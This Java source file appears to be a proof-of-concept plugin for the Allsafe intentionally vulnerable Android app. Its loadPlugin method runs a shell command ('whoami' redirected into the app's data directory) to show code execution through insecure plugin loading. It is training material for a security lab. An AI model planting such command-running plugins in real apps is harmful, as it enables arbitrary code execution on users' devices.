package infosecadventures.allsafe.plugin;

import android.os.Bundle;
import java.io.IOException;
import androidx.appcompat.app.AppCompatActivity;

public class Loader extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loader);
    }
    public static void loadPlugin() {
        try {

            String[] command = { "sh", "-c", "whoami > /data/data/infosecadventures.allsafe/file.txt" };

            Process process = Runtime.getRuntime().exec(command);

            int exitCode = process.waitFor();
            if (exitCode != 0) {
                throw new RuntimeException("Failed to create file. Exit code: " + exitCode);
            }
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException("Error occurred while creating file", e);
        }
    }
}